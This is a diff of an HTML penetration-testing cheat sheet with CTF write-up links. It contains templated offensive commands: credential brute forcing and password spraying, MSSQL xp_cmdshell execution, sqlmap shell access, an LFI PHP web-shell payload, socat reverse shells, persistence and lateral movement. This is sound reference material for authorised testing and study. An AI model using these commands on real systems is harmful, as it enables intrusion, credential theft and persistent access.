@@ -195,19 +195,6 @@
             
         </li>
     
-        <li class="chapter " data-level="3.2.1.3" data-path="../writeups/pwn/ret2win.html">
-            
-                <a href="../writeups/pwn/ret2win.html">
-            
-                    
-                    ret2win – ExampleCTF
-            
-                </a>
-            
-
-            
-        </li>
-    
 
             </ul>
             
@@ -227,12 +214,25 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="3.2.2.1" data-path="../writeups/crypto/xor-madness.html">
+        <li class="chapter " data-level="3.2.2.1" data-path="../writeups/crypto/hexcoding64.html">
             
-                <a href="../writeups/crypto/xor-madness.html">
+                <a href="../writeups/crypto/hexcoding64.html">
             
                     
-                    XOR Madness – CryptoCTF
+                    Hackaboo - Hexcoding64
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2.2" data-path="../writeups/forensics/spookyfishing.html">
+            
+                <a href="../writeups/forensics/spookyfishing.html">
+            
+                    
+                    Hackaboo - Spooky Phishing
             
                 </a>
             
@@ -430,20 +430,22 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <p>#Protocols</p>
+                                <h1 id="protocols">Protocols</h1>
 <p>Most common services and their ports (all TCP unless stated otherwise):</p>
-<p>|                       |                              |<br></br>| --------------------- | ---------------------------- |<br></br>| **Port(s)**           | **Service**                  |<br></br>| 21                    | FTP                          |<br></br>| 22                    | SSH                          |<br></br>| 23                    | Telnet                       |<br></br>| 25                    | SMTP (mail)                  |<br></br>| 587                   | secure SMTP                  |<br></br>| 53 (UDP)              | DNS                          |<br></br>| 67 (UDP) and 68 (UDP) | DHCP                         |<br></br>| 69 (UDP)              | TFTP                         |<br></br>| 80                    | HTTP                         |<br></br>| 443                   | HTTPS                        |<br></br>| 110                   | POP3 (mail)                  |<br></br>| 111                   | ONC RPC                      |<br></br>| 143                   | IMAP (mail)                  |<br></br>| 161 (UDP)             | SNMP                         |<br></br>| 139 and 445           | SMB                          |<br></br>| 1433                  | MSSQL                        |<br></br>| 1978                  | WiFi Mouse                   |<br></br>| 2049                  | NFS                          |<br></br>| 3306                  | MySQL                        |<br></br>| 3389                  | Windows Remote Desktop (RDP) |<br></br>| 5900                  | VNC                          |<br></br>| 5985                  | WinRM HTTP                   |<br></br>| 5986                  | WinRM HTTPS                  |</p>
+<p>|                       |                              |<br></br>| --------------------- | ---------------------------- |<br></br>| <strong>Port(s)</strong>           | <strong>Service</strong>                  |<br></br>| 21                    | FTP                          |<br></br>| 22                    | SSH                          |<br></br>| 23                    | Telnet                       |<br></br>| 25                    | SMTP (mail)                  |<br></br>| 587                   | secure SMTP                  |<br></br>| 53 (UDP)              | DNS                          |<br></br>| 67 (UDP) and 68 (UDP) | DHCP                         |<br></br>| 69 (UDP)              | TFTP                         |<br></br>| 80                    | HTTP                         |<br></br>| 443                   | HTTPS                        |<br></br>| 110                   | POP3 (mail)                  |<br></br>| 111                   | ONC RPC                      |<br></br>| 143                   | IMAP (mail)                  |<br></br>| 161 (UDP)             | SNMP                         |<br></br>| 139 and 445           | SMB                          |<br></br>| 1433                  | MSSQL                        |<br></br>| 1978                  | WiFi Mouse                   |<br></br>| 2049                  | NFS                          |<br></br>| 3306                  | MySQL                        |<br></br>| 3389                  | Windows Remote Desktop (RDP) |<br></br>| 5900                  | VNC                          |<br></br>| 5985                  | WinRM HTTP                   |<br></br>| 5986                  | WinRM HTTPS                  |</p>
 <p>Most common #Active-Directory  (AD) services and their ports:</p>
-<p>|                   |                          |<br></br>| ----------------- | ------------------------ |<br></br>| **Port(s)**       | **Service**              |<br></br>| 53                | #DNS                     |<br></br>| 88                | #Kerberos Authentication |<br></br>| 135               | WMI RPC                  |<br></br>| 138, 139, and 445 | #SMB                     |<br></br>| 389               | #LDAP                    |<br></br>| 636               | #LDAPS                   |<br></br>| 5355              | #LLMNR                   |<br></br>| 8530 and 8531     | #WSUS                    |</p>
-<p>**Indicators of Domain Controller:** ports 53, 88, 389 (LDAP), 636 (LDAPS)</p>
+<p>|                   |                          |<br></br>| ----------------- | ------------------------ |<br></br>| <strong>Port(s)</strong>       | <strong>Service</strong>              |<br></br>| 53                | #DNS                     |<br></br>| 88                | #Kerberos Authentication |<br></br>| 135               | WMI RPC                  |<br></br>| 138, 139, and 445 | #SMB                     |<br></br>| 389               | #LDAP                    |<br></br>| 636               | #LDAPS                   |<br></br>| 5355              | #LLMNR                   |<br></br>| 8530 and 8531     | #WSUS                    |</p>
+<p><strong>Indicators of Domain Controller:</strong> ports 53, 88, 389 (LDAP), 636 (LDAPS)</p>
 <p>●        %SYSTEMROOT%\NTDS\NTDS.dit has all information and user password hashes</p>
-<p># ARP Scan<br></br>#arp</p>
+<h1 id="arp-scan">ARP Scan</h1>
+<h1 id="arp">arp</h1>
 <p>arp-scan -l [range]</p>
 <p>netdiscover -r [range]</p>
-<p># Service Scan</p>
+<h1 id="service-scan">Service Scan</h1>
 <p>autorecon [targets] -v</p>
 <p>nmap -p⁠- -T4 -sC -sV -vv [targets]</p>
-<p># FTP<br></br>#ftp</p>
+<h1 id="ftp">FTP</h1>
+<h1 id="ftp">ftp</h1>
 <p>wget -m ftp://[username]:[password]@[host] ⇒ download all files</p>
 <p>ftp [host] OR ftp [username]@[host]</p>
 <p>Run help for a more comprehensive list of commands.</p>
@@ -454,12 +456,13 @@
 <p>●        get [file] ⇒ download</p>
 <p>●        mget * ⇒ get all files</p>
 <p>●        close</p>
-<p># SSH<br></br>#ssh #hydra #portforward</p>
+<h1 id="ssh">SSH</h1>
+<h1 id="ssh-hydra-portforward">ssh #hydra #portforward</h1>
 <p>ssh -L [port on my machine I will use]:localhost:[port on server I want] user@ip</p>
 <p>ssh [domain]\\[username]@[host] -p [port]</p>
 <p>hydra -l [username] -P [wordlist] -s [port] ssh://[host]</p>
-<p># SMTP</p>
-<p>#nmap #smtp #sendmail #swaks</p>
+<h1 id="smtp">SMTP</h1>
+<h1 id="nmap-smtp-sendmail-swaks">nmap #smtp #sendmail #swaks</h1>
 <p>nmap -p25, --script smtp-open-relay [host]</p>
 <p>ismtp -h [host]:25 -e [wordlist] -l 3</p>
 <p>smtp-user-enum -M [mode] -U [wordlist] -t [host]</p>
@@ -467,7 +470,8 @@
 <p>●        example wordlist: /usr/share/metasploit-framework/data/wordlists/unix_users.txt</p>
 <p>sendemail -s [host] -xu [username] -xp [password] -f [from] -t [to] -u [subject] -m [message] -a [attachment]</p>
 <p>swaks --server [host] -au [username] -ap [password] -f [from] -t [to] --h-Subject [subject] --body [message] --attach @[attachment] -n</p>
-<p># SNMP<br></br>#snmp #hydra #snmpwalk</p>
+<h1 id="snmp">SNMP</h1>
+<h1 id="snmp-hydra-snmpwalk">snmp #hydra #snmpwalk</h1>
 <p>hydra -P [wordlist] -v [host] snmp</p>
 <p>snmp-check -c [community] [ip]</p>
 <p>snmpwalk -c [community] -v [version] [host] NET-SNMP-EXTEND-MIB::nsExtendOutputFull</p>
@@ -481,12 +485,13 @@
 <p>●        Software Names:             1.3.6.1.2.1.25.6.3.1.2</p>
 <p>●        User Accounts: 1.3.6.1.4.1.77.1.2.25</p>
 <p>●        TCP Local Ports:                1.3.6.1.2.1.6.13.1.3</p>
-<p># SMB<br></br>#nbtscan #enum4linux #cme #crackmapexec #smbmap</p>
+<h1 id="smb">SMB</h1>
+<h1 id="nbtscan-enum4linux-cme-crackmapexec-smbmap">nbtscan #enum4linux #cme #crackmapexec #smbmap</h1>
 <p>nbtscan -r [range]</p>
 <p>enum4linux -v -a [host]</p>
 <p>crackmapexec smb [host] -u [username] -p [password] --rid-brute</p>
-<p>see [SMB Relay](#_lpa4lkravaz0)</p>
-<p>**SMBMap**</p>
+<p>see <a href="#_lpa4lkravaz0">SMB Relay</a></p>
+<p><strong>SMBMap</strong></p>
 <p>●        smbmap -H [host]</p>
 <p>○        -r ⇒ recursive</p>
 <p>○        --depth [depth] ⇒ traverse directory to specific depth (default 5)</p>
@@ -497,7 +502,7 @@
 <p>○        --download [file]</p>
 <p>○        --upload [file]</p>
 <p>OR</p>
-<p>**SMBClient** #smbclient</p>
+<p><strong>SMBClient</strong> #smbclient</p>
 <p>smbclient -N -L //[host]</p>
 <p>●        smbclient //[host]/[share]</p>
 <p>○        -L [host] ⇒ list shares</p>
@@ -516,43 +521,48 @@
 <p>○        recurse on</p>
 <p>○        mget *</p>
 <p>OR</p>
-<p>**SMBGet** #smbget</p>
+<p><strong>SMBGet</strong> #smbget</p>
 <p>●        smbget -R smb://[host]/[disk] ⇒ download all files</p>
-<p>**Bruteforce:** crackmapexec smb [host] -u [user/users/file] -p [password/passwords/file] --continue-on-success</p>
+<p><strong>Bruteforce:</strong> crackmapexec smb [host] -u [user/users/file] -p [password/passwords/file] --continue-on-success</p>
 <p>●        [-] ⇒ invalid credentials</p>
 <p>●        [+] ⇒ valid credentials</p>
 <p>●        (Pwn3d!) ⇒ user is local admin</p>
-<p>## Windows<br></br>#windows #shares</p>
+<h2 id="windows">Windows</h2>
+<h1 id="windows-shares">windows #shares</h1>
 <p>Shares</p>
 <p>●        SYSVOL ⇒ AD stuff (GPOs, logon scripts) C:\Windows\SYSVOL on DC</p>
 <p>●        C ⇒ C:\</p>
 <p>●        IPC ⇒ enumeration (admin scripts, event logs, etc)</p>
 <p>dir \\[domain or ip]\[share] /user:[username] [password]</p>
-<p>**Note:** domain ⇒ kerberos auth vs ip ⇒ NTLM auth</p>
+<p><strong>Note:</strong> domain ⇒ kerberos auth vs ip ⇒ NTLM auth</p>
 <p>net use [drive letter]: \\[domain]\[share] /user:[username] [password] /persistent:yes</p>
-<p># LDAP<br></br>#ldap #ldapsearch</p>
+<h1 id="ldap">LDAP</h1>
+<h1 id="ldap-ldapsearch">ldap #ldapsearch</h1>
 <p>nmap --script=ldap* [host]</p>
 <p>ldapdomaindump ldap://[host] -u '[domain]\[user]' -p [password] -o [dir]</p>
 <p>ldapsearch -x -H ldap://[host] -b base namingcontexts</p>
 <p>ldapsearch -x -H ldap://[host] -D '[domain]\[user]' -w [password] -b "DC=[subdomain],DC=[TLD]"</p>
-<p># Kerberos<br></br>#kerberos #kerbrute</p>
+<h1 id="kerberos">Kerberos</h1>
+<h1 id="kerberos-kerbrute">kerberos #kerbrute</h1>
 <p>kerbrute userenum --dc [DC] -d [domain] [userlist]</p>
 <p>kerbrute passwordspray --dc [DC] -d [domain] [userlist] [password]</p>
 <p>kerbrute bruteuser --dc [DC] -d [domain] [passlist] [user]</p>
 <p>kerbrute bruteforce --dc [DC] -d [domain] [credslist]</p>
 <p>●        credslist contains [user]:[pass] on each line</p>
-<p># RPC<br></br>#rpcclient #rpc</p>
-<p>[Useful RPC commands](<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration</a>)</p>
+<h1 id="rpc">RPC</h1>
+<h1 id="rpcclient-rpc">rpcclient #rpc</h1>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank">Useful RPC commands</a></p>
 <p>rpcclient -N -U "" [host]</p>
 <p>rpcclient -U [domain]/[user]%[password] [host]</p>
 <p>●        -N ⇒ no password</p>
 <p>●        --pw-nt-hash ⇒ supplied password is an nt hash</p>
-<p># SQL<br></br>#sql #mysql #impacket</p>
-<p>**MySQL:** mysql -h [host] -P [port] -u [username] -p'[password]'</p>
-<p>**PostgreSQL:** PGPASSWORD=[password] psql -h [host] -p [port] -U [username]</p>
-<p>**MSSQL**</p>
+<h1 id="sql">SQL</h1>
+<h1 id="sql-mysql-impacket">sql #mysql #impacket</h1>
+<p><strong>MySQL:</strong> mysql -h [host] -P [port] -u [username] -p'[password]'</p>
+<p><strong>PostgreSQL:</strong> PGPASSWORD=[password] psql -h [host] -p [port] -U [username]</p>
+<p><strong>MSSQL</strong></p>
 <p>impacket-mssqlclient [domain]/[username]:[password]@[host] -port [port] -windows-auth</p>
-<p>### Interesting Functions</p>
+<h3 id="interesting-functions">Interesting Functions</h3>
 <p>use master;</p>
 <p>EXEC sp_helprotect 'xp_cmdshell';</p>
 <p>EXEC sp_helprotect 'xp_regread';</p>
@@ -560,98 +570,98 @@
 <p>EXEC sp_helprotect 'xp_dirtree';</p>
 <p>EXEC sp_helprotect 'xp_subdirs';</p>
 <p>EXEC sp_helprotect 'xp_fileexist';</p>
-<p>### Command Execution</p>
+<h3 id="command-execution">Command Execution</h3>
 <p>SELECT value FROM sys.configurations WHERE name \= 'xp_cmdshell';</p>
 <p>EXEC sp_configure 'show advanced options', '1';</p>
 <p>RECONFIGURE WITH OVERRIDE;</p>
 <p>EXEC sp_configure 'xp_cmdshell', 1;</p>
 <p>RECONFIGURE;</p>
 <p>EXEC xp_cmdshell [command];</p>
-<p>### Impersonate</p>
+<h3 id="impersonate">Impersonate</h3>
 <p>SELECT * FROM sys.server_permissions WHERE permission_name \= 'IMPERSONATE';<br></br>SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;<br></br>EXECUTE AS login \= '[user]'; [query];</p>
 <p>EXECUTE AS login \= '[user]'; EXEC xp_cmdshell '[command]';</p>
-<p>### Over Link</p>
+<h3 id="over-link">Over Link</h3>
 <p>SELECT srvname, srvproduct, rpcout FROM master..sysservers;</p>
 <p>SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');</p>
 <p>SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''[command]''');</p>
-<p>**Note:** When using xp_cmdshell with OpenQuery, prepend a dummy query before it or else it won’t work.</p>
-<p># NFS</p>
+<p><strong>Note:</strong> When using xp_cmdshell with OpenQuery, prepend a dummy query before it or else it won’t work.</p>
+<h1 id="nfs">NFS</h1>
 <p>rpcinfo -p [host]</p>
 <p>showmount -e [host]</p>
 <p>mount [host]:[share] /mnt/[dir]</p>
 <p>unmount /mnt/[dir]</p>
-<p># WinRM</p>
+<h1 id="winrm">WinRM</h1>
 <p>crackmapexec winrm [hosts] -u [username] -p [password]</p>
 <p>evil-winrm -i [host] -u [user] -p [password]</p>
 <p>evil-winrm -i [host] -u [user] -H [hash]</p>
 <p>KRB5CCNAME=[ticket].ccache</p>
 <p>evil-winrm -i [host] -r [domain] -u [user]</p>
-<p># RDP</p>
+<h1 id="rdp">RDP</h1>
 <p>xfreerdp /u:[domain]\\[username] /p:[password] /v:[host] +clipboard /drive:[Windows share name],[kali folder]</p>
 <p>xfreerdp /u:[domain]\\[username] /pth:[hash] /v:[host] +clipboard /drive:[Windows share name],[kali folder]</p>
 <p>rdesktop -d [domain] -u [username] -p [password] [host]</p>
 <p>hydra -l [username] -P [wordlist] -s [port] rdp://[host]</p>
-<p># VNC</p>
+<h1 id="vnc">VNC</h1>
 <p>vncviewer [host]:[port] -passwd [password file]</p>
 <p>hydra -s [port] -P [wordlist] -t 4 [host] vnc</p>
 <p>Web Pen Testing</p>
-<p>**Payloads:** [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings</a>)</p>
-<p>**Encoding/Decoding:** [C](<a href="https://gchq.github.io/CyberChef/)\[yberChef\](https://gchq.github.io/CyberChef/" target="_blank">https://gchq.github.io/CyberChef/)\[yberChef\](https://gchq.github.io/CyberChef/</a>)</p>
-<p># Site Recon</p>
-<p>[NetCraft](<a href="https://sitereport.netcraft.com/" target="_blank">https://sitereport.netcraft.com/</a>)</p>
-<p>[Shodan](<a href="https://www.shodan.io" target="_blank">https://www.shodan.io</a>)</p>
-<p>[Censys](<a href="https://search.censys.io" target="_blank">https://search.censys.io</a>)</p>
-<p>[Wappalyzer](<a href="https://www.wappalyzer.com" target="_blank">https://www.wappalyzer.com</a>)</p>
-<p>[BuiltWith](<a href="https://builtwith.com" target="_blank">https://builtwith.com</a>)</p>
-<p># Subdomains</p>
+<p><strong>Payloads:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a></p>
+<p><strong>Encoding/Decoding:</strong> <a href="https://gchq.github.io/CyberChef/" target="_blank">C</a><a href="https://gchq.github.io/CyberChef/" target="_blank">yberChef</a></p>
+<h1 id="site-recon">Site Recon</h1>
+<p><a href="https://sitereport.netcraft.com/" target="_blank">NetCraft</a></p>
+<p><a href="https://www.shodan.io" target="_blank">Shodan</a></p>
+<p><a href="https://search.censys.io" target="_blank">Censys</a></p>
+<p><a href="https://www.wappalyzer.com" target="_blank">Wappalyzer</a></p>
+<p><a href="https://builtwith.com" target="_blank">BuiltWith</a></p>
+<h1 id="subdomains">Subdomains</h1>
 <p>theharvester -d [domain] -b [search engine]</p>
 <p>amass enum -passive -src -d [domain]</p>
 <p>amass enum -active -d [domain]</p>
 <p>cat [file with domains] | httprobe</p>
-<p># GoBuster</p>
+<h1 id="gobuster">GoBuster</h1>
 <p>gobuster dns -d [domain] -w [wordlist] -t [num threads]</p>
 <p>gobuster dir -u [target URL] -x [file extensions] -w [wordlist]</p>
 <p>gobuster dir -u [target URL] -x [file extensions] -w [wordlist] -U [auth username] -P [auth password] -s [invalid status codes] -t [num threads]</p>
 <p>●        -k ⇒ don’t check ssl cert</p>
-<p># ffuf</p>
-<p>**Directories:**        ffuf -w [wordlist] -u <a href="http://\[URL\]/FUZZ" target="_blank">http://\[URL\]/FUZZ</a></p>
-<p>**Files:**                     ffuf -w [wordlist] -u <a href="http://\[URL\]/FUZZ" target="_blank">http://\[URL\]/FUZZ</a> -e .aspx,.html,.php,.txt,.pdf -recursion</p>
-<p>**Subdomains:**     ffuf -w [wordlist] -u <a href="http://\[URL\" target="_blank">http://\[URL\</a>] -H "Host: FUZZ.[domain]"</p>
-<p>**POST Data:**          ffuf -w [wordlist] -X POST -d "[username=admin\\&amp;password=FUZZ]" -u <a href="http://\[URL\" target="_blank">http://\[URL\</a>]</p>
-<p>**From File:**           ffuf -request [req.txt] -request-proto http -w [wordlist]</p>
-<p>**Creds:**                   ffuf -request [req.txt] -request-proto http -mode [pitchfork/clusterbomb] -w [usernames.txt]:[HFUZZ] -w [passwords.txt]:[WFUZZ]</p>
-<p>**“Good” (Match)**</p>
+<h1 id="ffuf">ffuf</h1>
+<p><strong>Directories:</strong>        ffuf -w [wordlist] -u <a href="http://TARGET/FUZZ" target="_blank">http://TARGET/FUZZ</a></p>
+<p><strong>Files:</strong>                     ffuf -w [wordlist] -u <a href="http://TARGET/FUZZ" target="_blank">http://TARGET/FUZZ</a> -e .aspx,.html,.php,.txt,.pdf -recursion</p>
+<p><strong>Subdomains:</strong>     ffuf -w [wordlist] -u <a href="http://TARGET" target="_blank">http://TARGET</a> -H "Host: FUZZ.[domain]"</p>
+<p><strong>POST Data:</strong>          ffuf -w [wordlist] -X POST -d "[username=admin\\&amp;password=FUZZ]" -u <a href="http://TARGET" target="_blank">http://TARGET</a></p>
+<p><strong>From File:</strong>           ffuf -request [req.txt] -request-proto http -w [wordlist]</p>
+<p><strong>Creds:</strong>                   ffuf -request [req.txt] -request-proto http -mode [pitchfork/clusterbomb] -w [usernames.txt]:[HFUZZ] -w [passwords.txt]:[WFUZZ]</p>
+<p><strong>“Good” (Match)</strong></p>
 <p>●        -mc ⇒ status code</p>
 <p>●        -ms ⇒ response size</p>
 <p>●        -mw ⇒ number of words</p>
 <p>●        -ml ⇒ number of lines</p>
 <p>●        -mr ⇒ regex pattern</p>
-<p>**“Bad” (Filter)**</p>
+<p><strong>“Bad” (Filter)</strong></p>
 <p>●        -fc ⇒ status code</p>
 <p>●        -fs ⇒ response size</p>
 <p>●        -fw ⇒ number of words</p>
 <p>●        -fl ⇒ number of lines</p>
 <p>●        -fr ⇒ regex pattern</p>
-<p># BurpSuite</p>
-<p>### BurpSuite Tabs</p>
-<p>●        **Target** ⇒ site map and spidering</p>
-<p>●        **Proxy** ⇒ intercept traffic</p>
-<p>●        **Intruder** ⇒ bruteforce attacks (think automated repeater)</p>
-<p>●        **Repeater** ⇒ send same request multiple times with different parameters</p>
-<p>●        **Sequencer** ⇒ analyse quality of randomness in session tokens</p>
-<p>●        **Decoder** ⇒ encode/decode text as hex, UTF, etc.</p>
-<p>●        **Extender** ⇒ add plugins</p>
-<p>### Intruder Attack Types</p>
+<h1 id="burpsuite">BurpSuite</h1>
+<h3 id="burpsuite-tabs">BurpSuite Tabs</h3>
+<p>●        <strong>Target</strong> ⇒ site map and spidering</p>
+<p>●        <strong>Proxy</strong> ⇒ intercept traffic</p>
+<p>●        <strong>Intruder</strong> ⇒ bruteforce attacks (think automated repeater)</p>
+<p>●        <strong>Repeater</strong> ⇒ send same request multiple times with different parameters</p>
+<p>●        <strong>Sequencer</strong> ⇒ analyse quality of randomness in session tokens</p>
+<p>●        <strong>Decoder</strong> ⇒ encode/decode text as hex, UTF, etc.</p>
+<p>●        <strong>Extender</strong> ⇒ add plugins</p>
+<h3 id="intruder-attack-types">Intruder Attack Types</h3>
 <p>Single Payload Set</p>
-<p>●        **Sniper:** each payload goes to each payload position, in turn</p>
-<p>●        **Battering Ram:** same payload in all positions</p>
+<p>●        <strong>Sniper:</strong> each payload goes to each payload position, in turn</p>
+<p>●        <strong>Battering Ram:</strong> same payload in all positions</p>
 <p>Multiple Payload Sets</p>
-<p>●        **Pitchfork:** same payload position from multiple sets at a time (credential stuffing)</p>
-<p>●        **Cluster Bomb:** all payload combinations</p>
-<p>### Scoping Target</p>
+<p>●        <strong>Pitchfork:</strong> same payload position from multiple sets at a time (credential stuffing)</p>
+<p>●        <strong>Cluster Bomb:</strong> all payload combinations</p>
+<h3 id="scoping-target">Scoping Target</h3>
 <p>●        right-click → Add to scope</p>
 <p>●        click filter bar on top → under Filter by request type, check Show only in-scope items</p>
-<p># SQLmap</p>
+<h1 id="sqlmap">SQLmap</h1>
 <p>●        sqlmap -u [base URL] --crawl=1 (check all pages for injectability)</p>
 <p>●        sqlmap -u [website URL] --current-user (gets current user)</p>
 <p>●        sqlmap -u [website URL] --dbs (gets databases)</p>
@@ -661,40 +671,40 @@
 <p>●        sqlmap -u [website URL] -D [database] -T [table] --columns (gets columns)</p>
 <p>●        sqlmap -u [website URL] -D [database] -T [table] -C [columns → can be multiple separated by ,] --dump</p>
 <p>●        sqlmap -u [website URL] --os-shell (attempts to get shell on target)</p>
-<p># Local File Inclusion (LFI)</p>
-<p>### Directories to try</p>
+<h1 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h1>
+<h3 id="directories-to-try">Directories to try</h3>
 <p>/etc/passwd</p>
 <p>/var/log/apache2/access.log</p>
 <p>C:\Windows\System32\drivers\etc\hosts</p>
-<p>### PHP wrappers</p>
+<h3 id="php-wrappers">PHP wrappers</h3>
 <p>php://filter/resource=[file].php ⇒ display contents of PHP file</p>
 <p>php://filter/convert.base64-encode/resource=[file].php</p>
 <p>data://text/plain,\&lt;?php[code]?&gt; ⇒ run PHP code</p>
 <p>data://text/plain;base64,[base64] ⇒ run base 64 encoded PHP code</p>
 <p>data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==\&amp;cmd=ls</p>
-<p># WordPress</p>
-<p>wpscan --url <a href="http://\[host\" target="_blank">http://\[host\</a>] -e vp,vt --detection-mode aggressive -v --api-token [token]</p>
-<p>get token from [<a href="https://wpscan.com/profile\](https://wpscan.com/profile" target="_blank">https://wpscan.com/profile\](https://wpscan.com/profile</a>)</p>
-<p># Git</p>
-<p>git-dumper <a href="http://\[url\" target="_blank">http://\[url\</a>] [output dir]</p>
+<h1 id="wordpress">WordPress</h1>
+<p>wpscan --url <a href="http://host" target="_blank">http://host</a> -e vp,vt --detection-mode aggressive -v --api-token [token]</p>
+<p>get token from <a href="https://wpscan.com/profile" target="_blank">https://wpscan.com/profile</a></p>
+<h1 id="git">Git</h1>
+<p>git-dumper <a href="http://url" target="_blank">http://url</a> [output dir]</p>
 <p>git status</p>
 <p>git log</p>
 <p>git show [commit hash]</p>
 <p>git reset --hard [commit hash]</p>
 <p>Linux/Kali</p>
 <p>I will think of a better title for this section, I swear.</p>
-<p>[Linux Terminal Cheat Sheet](<a href="https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/" target="_blank">https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/</a>)</p>
-<p>[Linux Printing Tricks](<a href="https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md" target="_blank">https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md</a>)</p>
-<p>[Reverse Shells](<a href="https://www.revshells.com" target="_blank">https://www.revshells.com</a>)</p>
+<p><a href="https://docs.google.com/document/d/1vJxoHrjW607NJDLC1Zln1llrEIqrS6Ea3j9ihJTdblg/" target="_blank">Linux Terminal Cheat Sheet</a></p>
+<p><a href="https://github.com/RedefiningReality/Linux-Defence-Materials/blob/main/Linux%20Terminal/Printing%20Tricks.md" target="_blank">Linux Printing Tricks</a></p>
+<p><a href="https://www.revshells.com" target="_blank">Reverse Shells</a></p>
 <p>socat file:`tty`,raw,echo=0 tcp-listen:[port]</p>
 <p>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]</p>
 <p>socat.exe exec:'cmd.exe',pipes TCP4:[ip]:[port]</p>
-<p># Serving Files</p>
-<p>**HTTP:** python3 -m http.server [port] --directory [directory]</p>
-<p>**SMB:** impacket-smbserver [share] [directory] -port [port] -username [username] -password [password] -smb2support</p>
-<p>**FTP:** python3 -m pyftpdlib -d [directory] -p [port] -u [username] -P [password]</p>
+<h1 id="serving-files">Serving Files</h1>
+<p><strong>HTTP:</strong> python3 -m http.server [port] --directory [directory]</p>
+<p><strong>SMB:</strong> impacket-smbserver [share] [directory] -port [port] -username [username] -password [password] -smb2support</p>
+<p><strong>FTP:</strong> python3 -m pyftpdlib -d [directory] -p [port] -u [username] -P [password]</p>
 <p>●        add -w for write permission</p>
-<p># Beautify Shell</p>
+<h1 id="beautify-shell">Beautify Shell</h1>
 <p>●        python -c 'import pty; pty.spawn("/bin/bash")' OR script -qc /bin/bash /dev/null OR perl -e 'exec "/bin/sh";'</p>
 <p>●        ^Z (Ctrl+Z)</p>
 <p>●        stty -a</p>
@@ -704,8 +714,8 @@
 <p>●        fg (yes, you have to type it twice → this is not a typo)</p>
 <p>●        export term=xterm</p>
 <p>●        stty rows [rows] columns [columns]</p>
-<p># Persistence</p>
-<p>### Create New Service</p>
+<h1 id="persistence">Persistence</h1>
+<h3 id="create-new-service">Create New Service</h3>
 <p>edit /etc/systemd/system/[service].service</p>
 <table>
 <thead>
@@ -721,24 +731,24 @@
 </table>
 <p>systemctl daemon reload</p>
 <p>systemctl enable [service]</p>
-<p>### Create New Cron Job</p>
+<h3 id="create-new-cron-job">Create New Cron Job</h3>
 <p>crontab -e</p>
 <p>[minute] [hour] [day of month] [month] [day of week] [command]</p>
 <p>Windows</p>
-<p>[Windows Terminal Cheat Sheet](<a href="https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ\_PPBYliMXCy-4RNE0UMw/" target="_blank">https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ\_PPBYliMXCy-4RNE0UMw/</a>)</p>
-<p>[PowerView Cheat Sheet](<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</a>)</p>
-<p># Lateral Movement</p>
-<p>## Remote Enumeration</p>
+<p><a href="https://docs.google.com/document/d/1CGgADAOZQuMXAyzXVeXRNhQ_PPBYliMXCy-4RNE0UMw/" target="_blank">Windows Terminal Cheat Sheet</a></p>
+<p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank">PowerView Cheat Sheet</a></p>
+<h1 id="lateral-movement">Lateral Movement</h1>
+<h2 id="remote-enumeration">Remote Enumeration</h2>
 <p>net session \\[host]</p>
 <p>reg query \\[host]\[key] ...</p>
 <p>net view \\[host]</p>
 <p>dir \\[host]\[share]</p>
 <p>net use * \\[host]\[share] /user:[domain]\[username] [password]</p>
 <p>tasklist /s [host] ...</p>
-<p>## Movement</p>
+<h2 id="movement">Movement</h2>
 <p>psexec \\[host] -u [username] -p [password] -i cmd</p>
 <p>winrs -u:[username] -p:[password] -r:[host] cmd</p>
-<p>### Switch Users</p>
+<h3 id="switch-users">Switch Users</h3>
 <p>runas /user:[domain]\[username] cmd</p>
 <p>●        /netonly to keep same user access on local machine (only login for network connections)</p>
 <p>●        /savecred to get creds from or save creds to Windows Credential Manager</p>
@@ -746,67 +756,67 @@
 <p>●        -d [domain]</p>
 <p>●        -r [host]:[port] ⇒ reverse shell</p>
 <p>●        -b ⇒ bypass UAC</p>
-<p>### Create New Process (WMI)</p>
+<h3 id="create-new-process-wmi">Create New Process (WMI)</h3>
 <p>wmic /node:[ip] process call create [executable]</p>
 <p>Invoke-CimMethod -ClassName Win32_Process -MethodName Create -CimSession (New-CimSession -ComputerName "[ip]") -Arguments @{CommandLine="[executable]"}</p>
-<p>### Create New Service</p>
+<h3 id="create-new-service">Create New Service</h3>
 <p>sc \\[host] create [service] binPath= "[executable]" start= auto displayname= "[name]"</p>
 <p>sc \\[host] description [service] "[description]"</p>
 <p>sc \\[host] [start/stop/delete] [service]</p>
-<p>### Modify Existing Service</p>
+<h3 id="modify-existing-service">Modify Existing Service</h3>
 <p>sc \\[host] qc vss → ✓ service runs as LocalSystem</p>
 <p>sc \\[host] query vss → ✓ service is currently not running</p>
 <p>sc \\[host] config vss binpath= "[executable]"</p>
